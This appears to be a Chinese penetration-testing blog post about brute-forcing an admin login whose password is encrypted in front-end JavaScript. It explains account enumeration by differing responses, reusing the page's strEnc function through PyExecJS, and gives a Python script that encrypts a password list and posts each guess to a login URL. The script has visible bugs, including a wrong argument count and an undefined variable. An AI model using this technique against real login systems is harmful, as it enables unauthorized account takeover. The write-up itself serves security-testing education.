# 口令爆破之突破前端JS加密

### 0x00 前言

近期安全测试时发现一个系统前台使用了SSO，但是在比较隐蔽API中发现了后台的登录接口，该接口未使用SSO，同时没有图形验证码等校验，通过分析最终爆破进入后台。

### 0x01 确认攻击途径

通过信息搜集找到后台登录URL，由于URL比较敏感，这里以 `admin/login`替代，尝试登录发现没有图形验证码等校验

![](../Images/fe10ff8473052f82092f7c069379cba9.png)

通过BurpSuite抓包发现密码字段被加密了

![](../Images/d90cc132e12f2ad9789c77c12e9ee144.png)

根据回显不同，可进行口令爆破。

**攻击思路：**

1.  通过回显不同获取存在的账号
    
2.  分析加密方法
    
3.  使用加密算法加密密码字典
    
4.  脚本发包爆破
    

这里也可以使用Selenium一把梭暴力解决，但是不建议，如果实在没折的话再考虑此方法。

### 0x02 分析加密方法

加密参数为 `u_pwd`，在html文件中搜索该特殊字符

![](../Images/66a95703a9942fb4423578b96622e013.png)

可以看到加密算法是将 `u_pwd`和 `u_name`拼接之后使用 `strEnc`函数处理，然后再和一个随机16位字符串拼接。

**测试加密算法**

复制定位到的 `strEnc`函数JS代码，以Chrome为例。`F12->Sources->Overrides->右键Snippets->粘贴`

![](../Images/f5f490dc3a0fead235d27865bf55731b.png)

在新建的 `snippet上右键>Run`

![](../Images/60dec7be1bf98a0ab141931d44192809.png)

输入密码测试

![](../Images/98bf846a8fa42efaedb8fdab2cef2c83.png)

OK，加密代码找到了，运行对应的加密JS代码即可获取对应密码的加密字符串。

### 0x03 攻击测试

这里有多种途径，官方推荐PyV8、Node.js、PhantomJS、Nashorn，之前跟爬虫的大哥学习的时候发现他们好多使用的PyExecJS，所以也用这个试试，有兴趣的可以搜搜对应的优缺点。

安装 `Node.js`之后 `pip installPyExecJS`即可

![](../Images/303cee65461d0131bfb7a31403ac5934.png)

脚本爆破

```
1.  `import requests`
    
2.  `import execjs`
    
3.  `import json`
    
4.  
    
5.  `def gen_encode_pass(user_name, user_password):`
    
6.  `    with open("/Users/w2n1ck/Desktop/des.js", "r") as f:   `
    
7.  `        data_func = f.read()`
    
8.  `    ctx = execjs.compile(data_func)`
    
9.  `    up = ctx.call('strEnc', user_password, user_name)`
    
10.  `    rand = ctx.call('randomString', 16)`
     
11.  `    password = str(up) + str(rand)`
     
12.  `    print('encode: u_password:',password)`
     
13.  `    return password`
     
14.  
     
15.  
     
16.  `_url = "https://admin.baidu.com:443/admin/login"`
     
17.  `_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "https://admin.baidu.cn/admin/login", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "u_token": "", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}`
     
18.  `_data = {"u_name": "admin"}`
     
19.  
     
20.  `pass_dict = open('/Users/w2n1ck/Desktop/admin_pass.txt', 'r')`
     
21.  
     
22.  `for p in pass_dict.readlines():`
     
23.  `    p = str(p.strip())`
     
24.  `    print("decode: " + p)`
     
25.  `    password = gen_encode_pass(p)`
     
26.  `    burp0_data['u_pwd'] = password`
     
27.  `    resp = requests.post(_url, headers=_headers, data=_data)`
     
28.  `    con = json.loads(resp.content)`
     
29.  `    if 'false' in str(con):`
     
30.  `        print(con)`
     
31.  
     
32.  `pass_dict.close()`
     
```
